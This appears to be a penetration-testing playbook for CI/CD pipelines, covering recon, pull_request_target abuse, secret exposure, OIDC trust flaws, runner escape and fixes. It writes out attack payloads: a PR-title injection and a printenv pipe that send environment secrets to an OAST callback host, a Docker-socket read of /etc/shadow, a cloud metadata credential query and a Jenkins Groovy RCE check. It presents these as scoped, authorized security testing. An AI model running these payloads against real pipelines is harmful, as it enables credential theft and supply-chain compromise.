---
name: cicd_pipeline
description: CI/CD pipeline security testing - pipeline injection, secret exposure, artifact integrity, runner escape, and supply chain compromise
---

# CI/CD Pipeline Security Testing

A CI/CD pipeline is the automated build/test/deploy machinery (GitHub Actions, GitLab CI, Jenkins, CircleCI, Azure Pipelines, Buildkite, Drone, Tekton, Argo) that turns source commits into deployable artifacts and pushes them to production. It is high-value because it sits between untrusted code and trusted infrastructure: it holds cloud credentials, registry push rights, signing keys, and deploy access, and it executes attacker-influenceable inputs (branch names, PR titles, commit messages, dependency manifests) with those privileges. The attacker objective is to execute code in the pipeline context, exfiltrate secrets/tokens, or tamper with build artifacts so the malicious output is signed, published, and deployed as if it were trusted.

## Attack Surface

**Scope**
- Pipeline definition files: `.github/workflows/*.yml`, `.gitlab-ci.yml`, `Jenkinsfile`, `.circleci/config.yml`, `azure-pipelines.yml`, `bitbucket-pipelines.yml`, `.drone.yml`, `cloudbuild.yaml`, Tekton/Argo `PipelineRun` CRDs
- Build runners/agents (ephemeral or persistent VMs, self-hosted runners, Docker-in-Docker, Kubernetes executors)
- Secret stores wired into jobs (GitHub/GitLab CI variables, Vault, AWS/GCP/Azure secret managers, OIDC federation)
- Artifact registries and caches (GHCR, Docker Hub, ECR/GAR/ACR, Artifactory/Nexus, npm/PyPI/Maven, GitHub artifact/cache storage)
- Webhooks, deploy keys, bot accounts, and the SCM API the pipeline authenticates to

**Attacker-controlled entry points**
- Pull/merge requests from forks that trigger workflows (`pull_request_target`, `workflow_run`, GitLab `merge_request` pipelines)
- Branch names, tag names, PR titles/bodies, commit messages, issue comments interpolated into shell
- Dependency manifests (`package.json`, `requirements.txt`, `pom.xml`, Dockerfile `FROM`) and lockfiles
- Reusable/3rd-party actions, shared libraries, container base images, and pipeline includes (`include:`, `extends:`)
- Self-hosted runner registration tokens and the runner's local network position

**Exposed assets when compromised**
- Long-lived cloud keys, registry push tokens, code-signing/Sigstore keys, kubeconfigs, SSH deploy keys
- The default SCM token (`GITHUB_TOKEN`, `CI_JOB_TOKEN`) and its repo/org write scope
- Internal network reachable from the runner (metadata endpoints, internal registries, k8s API)

## Recon & Enumeration

Most recon is repository-driven. Clone with full history first, then inspect pipeline config, secret handling, and trigger logic.

```
# Clone target with full history (deleted secrets live in old commits)
git clone <repo> /tmp/t && cd /tmp/t

# Locate every pipeline definition and runner config
find . -regextype posix-extended -regex \
  '.*/(\.github/workflows/.*\.ya?ml|\.gitlab-ci\.yml|Jenkinsfile|\.circleci/config\.yml|azure-pipelines\.yml|bitbucket-pipelines\.yml|\.drone\.yml|cloudbuild\.ya?ml)'

# Secret scanning across full history (run both - they catch different things)
trufflehog git file:///tmp/t --only-verified --json
gitleaks detect --source /tmp/t --report-format json --report-path /tmp/gitleaks.json --log-opts="--all"

# Static analysis of pipeline definitions for injection sinks and misconfig
semgrep --config p/ci --config p/secrets --config p/github-actions /tmp/t

# Scan committed images / IaC / dependency manifests for CVEs + secrets
trivy fs --scanners vuln,secret,misconfig /tmp/t
trivy config /tmp/t   # Dockerfile / k8s / terraform misconfig
```

Externally exposed CI control planes (self-hosted Jenkins, GitLab, Drone, Argo, Buildkite agents):

```
naabu -host ci.target.tld -p 80,443,8080,8443,5000,2375,9000,50000 -silent | httpx -silent -title -tech-detect
nmap -sV -p 8080,50000,443 ci.target.tld          # Jenkins web=8080, JNLP agent=50000
nuclei -u https://jenkins.target.tld -tags jenkins,exposure,misconfig -s critical,high,medium -silent
nuclei -u https://gitlab.target.tld -tags gitlab,cve -s critical,high -silent
httpx -u https://jenkins.target.tld/script -status-code   # unauth Groovy console
httpx -u https://jenkins.target.tld/whoAmI/api/json       # auth/anon identity leak
ffuf -u https://ci.target.tld/FUZZ -w /usr/share/seclists/Discovery/Web-Content/jenkins.txt -mc 200,401,403
```

SCM/API-side enumeration with the platform CLI (use authorized tokens only):

```
# GitHub: list org secrets, runners, workflows, OIDC trust
gh api /repos/{owner}/{repo}/actions/secrets
gh api /repos/{owner}/{repo}/actions/runners        # self-hosted runners (escape targets)
gh api /orgs/{org}/actions/permissions
# GitLab: project CI variables, protected status, runner registration
glab variable list -R group/project
curl -s --header "PRIVATE-TOKEN: $TOKEN" https://gitlab.target.tld/api/v4/projects/<id>/variables
```

Asset-specific tools to install if missing:
```
# OIDC / cloud creds reachable from a runner
pipx install awscli || pip install awscli ; curl https://sdk.cloud.google.com | bash   # gcloud
# Software bill of materials + vuln match on built artifacts
which syft grype || (curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh -s -- -b /usr/local/bin && \
  curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b /usr/local/bin)
# Supply-chain posture: actionlint for GitHub Actions, zizmor for workflow audits
go install github.com/rhysd/actionlint/cmd/actionlint@latest
pipx install zizmor    # GitHub Actions security audit (injection, pwn requests, artifact poisoning)
# OAST callbacks from inside the runner
interactsh-client -v
```

## Methodology

1. **Inventory the pipeline.** Identify platform, every workflow/job, trigger events, runner type (hosted vs self-hosted), and which jobs touch secrets, registries, or deploy targets.
2. **Map trust boundaries.** For each workflow determine: who can trigger it (fork PRs? comments? tags?), what privileges the trigger grants (read vs write token, secret access), and whether untrusted code runs before or after the privileged step. This is the single most important step.
3. **Trace attacker input into sinks.** Follow branch/tag/PR/commit/issue fields and dependency manifests into `run:`/`script:`/`sh` blocks, `${{ }}` interpolation, template expansions, and `eval`-like constructs.
4. **Enumerate secrets and their scope.** List CI variables, OIDC trust policies, and what each credential can do (registry push, cloud admin, k8s deploy). Check masking/protection flags.
5. **Assess the runner.** Determine isolation (ephemeral vs reused), Docker/k8s socket exposure, network reachability to metadata/internal services, and whether a fork PR can land on a self-hosted runner.
6. **Assess artifact integrity.** Check how artifacts are built, whether dependencies and base images are pinned by digest, whether artifacts are signed/attested, and whether the publish step can be reached by untrusted code.
7. **Build a PoC in a scoped branch/fork.** Demonstrate command execution, secret echo to OAST, or artifact tampering with a benign marker - never exfiltrate real production credentials to confirm.
8. **Trace escalation.** Show how the foothold (token/secret/runner) reaches production: registry push -> deploy, cloud creds -> account access, SCM token -> protected branch.

## Key Weaknesses / Techniques

### Pipeline / command injection
Untrusted fields interpolated directly into a shell. In GitHub Actions, `${{ github.event.* }}` is expanded by the runner *before* the shell sees it, so quoting does not protect you.

```yaml
# VULNERABLE - PR title flows straight into bash
- run: echo "Building PR: ${{ github.event.pull_request.title }}"
```
PoC title that runs commands: `a"; curl https://<id>.oast.fun/$(env|base64 -w0); echo "`
Other tainted fields: `github.head_ref`, `github.event.issue.title`, `github.event.comment.body`, `github.event.pull_request.body`, branch/tag names. GitLab equivalent: `$CI_COMMIT_BRANCH`, `$CI_MERGE_REQUEST_TITLE` in `script:`. Detect with `zizmor` / `actionlint` and:
```
semgrep --config p/github-actions /tmp/t
grep -rnE '\$\{\{\s*github\.(event|head_ref)' .github/workflows/
```

### Poisoned-pipeline / `pull_request_target` abuse
`pull_request_target` and `workflow_run` run with the *base* repo's write token and secrets, but if the workflow checks out PR head code and runs it (build, test, lint, custom action), fork attackers get code execution with full privileges.
```yaml
# VULNERABLE - privileged trigger + checkout of untrusted PR head
on: pull_request_target
jobs: { build: { steps: [
  { uses: actions/checkout@v4, with: { ref: "${{ github.event.pull_request.head.sha }}" } },
  { run: npm install && npm test } ] } }   # postinstall/test scripts run with secrets
```
PoC: open a PR from a fork that adds a `postinstall` hook or modifies the test script to `printenv | curl -s --data-binary @- https://<id>.oast.fun/`. Confirm secrets appear in the OAST log.

### Secret exposure
- Secrets echoed/logged (masking only redacts exact matches; base64/reversed/split values leak: `echo $SECRET | base64`).
- Secrets passed as build args or baked into image layers: `docker history --no-trunc <image>`; inspect layers with `dive` / `trivy image --scanners secret`.
- Secrets in artifacts, caches, or env dumps uploaded with `actions/upload-artifact`.
- `pull_request` (not `_target`) does NOT expose secrets to forks - verify which trigger is in use before claiming exposure.
- Self-hosted runner reuse leaves prior jobs' secrets in `/tmp`, env, and Docker cache.
```
trufflehog filesystem ./artifacts --only-verified
grep -rIE '(AKIA[0-9A-Z]{16}|ghp_[0-9A-Za-z]{36}|glpat-[0-9A-Za-z_-]{20}|eyJ[A-Za-z0-9_-]+\.eyJ)' ./artifacts
trivy image --scanners secret <built-image>
```

### OIDC / cloud trust misconfiguration
Pipelines federate to clouds via OIDC instead of static keys. Overly broad trust policies are the common flaw: an AWS role trusting `repo:org/*:*` or with no `sub` condition lets any repo/branch (including forks running attacker code) assume it.
```
# From a runner foothold, what cloud identity is reachable?
curl -s "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN"
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name <assumed-role>
# Inspect the trust policy for missing sub/branch conditions
aws iam get-role --role-name <role> --query 'Role.AssumeRolePolicyDocument'
```

### Artifact / supply-chain integrity
- Unpinned dependencies and actions (`uses: actions/checkout@main`, `FROM node:latest`) - a compromised upstream tag executes in your pipeline. Pin actions by full commit SHA, images by `@sha256:`.
- Cache poisoning: a fork PR writes to a shared cache key that a privileged job later restores, injecting a malicious binary into the trusted build.
- Dependency confusion: pipeline resolves an internal package name from a public registry; publish a higher-version public package to hijack the build.
- No build provenance/signing: nothing prevents a tampered artifact from being published and deployed.
```
# Find unpinned actions and floating image tags
grep -rnE 'uses:\s+[^@]+@(main|master|v?[0-9]+)\s*$' .github/workflows/
grep -rniE '^\s*FROM\s+\S+:(latest|[0-9.]+)\s*$' . --include=Dockerfile
# Generate SBOM + diff against published artifact to detect injected components
syft <built-image> -o spdx-json > sbom.json ; grype sbom:sbom.json
# Verify signing/attestation exists at all
cosign verify <image> --certificate-identity-regexp '.*' --certificate-oidc-issuer-regexp '.*' 2>&1 | head
```

### Runner escape / privilege abuse
- Docker socket mounted into jobs (`/var/run/docker.sock`) or DinD: spawn a privileged container, mount host FS.
- Self-hosted runners on persistent hosts with network reach to internal services or metadata.
- Jenkins unauth Groovy console (`/script`), `build-with-parameters` injection, or agent JNLP takeover.
```
ls -la /var/run/docker.sock && docker run -v /:/host --rm alpine cat /host/etc/shadow   # benign read PoC
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/   # metadata from runner
# Jenkins unauth RCE check (authorized targets only)
curl -s "https://jenkins.target.tld/script" --data-urlencode 'script=println "id".execute().text'
```

## Validation

1. **Injection:** demonstrate execution of an attacker-controlled command via a tainted field with a benign payload that hits an `interactsh-client` OAST domain or writes a harmless marker file to the job artifacts. Capture the workflow run URL and the OAST interaction.
2. **Secret exposure:** show the secret value (or a verifiable hash/last-4) reaching a destination it must not - the build log, an uploaded artifact, or an OAST callback. For OIDC, run `aws sts get-caller-identity` (or cloud equivalent) and show the assumed identity, then stop.
3. **Artifact integrity:** rebuild or modify a dependency/cache in a scoped fork/branch and show the malicious marker appearing in the published artifact's SBOM (`syft`/`grype`) or image layers, proving untrusted input reaches the trusted output.
4. **Runner escape:** read a host-only file (e.g. `/host/etc/hostname`) or reach an internal-only service from the runner; do not pivot further than needed to prove reachability.
5. Always capture the run ID/URL, the exact trigger event, and the diff that introduced the PoC so the finding is reproducible.

## False Positives

- `pull_request` (not `pull_request_target`/`workflow_run`) running on fork PRs - by design it has a read-only token and NO secret access; injected code cannot reach secrets.
- Secrets "in logs" that are actually masked (`***`) and never reconstructed via encoding tricks.
- Unpinned action from `actions/*` or a verified-publisher org under organization allowlist + tag protection - lower risk than an arbitrary third-party action, note but don't overstate.
- Static keys found by a scanner that are already rotated, fake/example, or scoped to a throwaway sandbox - verify with `trufflehog --only-verified`.
- Self-hosted runner exposed but with ephemeral, single-job isolation and no fork-PR auto-run (requires maintainer approval) - the reuse/escape risk is mitigated.
- Docker socket present but the executor is a per-job ephemeral microVM (gVisor/Firecracker/Kata) - host is still isolated.
- OIDC role assumable but with a tight `sub` condition (`repo:org/repo:ref:refs/heads/main`) that forks/branches cannot satisfy.

## Chaining & Impact

- Fork PR injection -> dump `GITHUB_TOKEN`/CI job token -> push to protected branch or open a malicious release -> deploy.
- Pipeline RCE -> read OIDC/cloud creds reachable from runner -> assume over-trusted role -> cloud account compromise (read secret manager, S3, deploy infra).
- Cache/dependency poisoning -> malicious code lands in a signed, published artifact -> downstream consumers/production auto-pull it (classic software supply-chain compromise).
- Registry push token exposure -> overwrite a `:latest` or mutable tag -> next deploy pulls the backdoored image.
- Self-hosted runner foothold -> lateral movement into internal network / k8s API (see kubernetes skill) -> cluster compromise.
- SCM token write scope -> modify the pipeline definition itself -> persistent backdoor that survives credential rotation.

## Pro Tips

1. The trigger event is everything: `pull_request_target` + `workflow_run` + checkout-of-head is the canonical critical bug. Grep for these triggers first.
2. GitHub Actions expression injection happens at `${{ }}` expansion time, before the shell - quoting in the `run:` block does not help. The fix is passing tainted data via `env:` and referencing `"$VAR"`; flag configs that don't.
3. Secret masking is exact-match only. Test exfil via `base64`, `rev`, `cut`, or printing one char per line - if it leaks past masking, it's a real finding.
4. Always run `trufflehog`/`gitleaks` against the FULL git history (`--log-opts=--all`), not just `HEAD` - removed secrets stay in old commits and remain valid until rotated.
5. Self-hosted runners that auto-run fork PRs are near-guaranteed RCE; check `runs-on:` labels and the runner approval policy before testing.
6. OIDC has largely replaced static keys - shift focus to trust policy conditions (`sub`, `aud`, `repository`); a missing `sub` condition is the modern equivalent of a leaked root key.
7. Use a private fork/scoped branch and benign OAST payloads for PoCs; never exfiltrate live production credentials to an external host to "prove" exposure.
8. Pin everything by digest in your recommendations: actions by 40-char SHA, images by `@sha256:` - tag-based references are mutable and the root of most upstream-compromise chains.
9. `zizmor` catches GitHub Actions issues (template injection, pwn-requests, artifact poisoning) that generic SAST misses - run it alongside `semgrep`/`actionlint`.

## Summary

CI/CD compromise is rarely one bug - it's a chain from an attacker-influenceable trigger, through code execution in a privileged context, to secret or artifact abuse that reaches production. Map the trust boundary for every workflow (who can trigger it and what that grants), trace tainted input into shell sinks, scope every credential's blast radius, and verify artifact integrity end to end. Prove findings with benign OAST payloads in a scoped branch, and stop at the minimum needed to demonstrate impact.
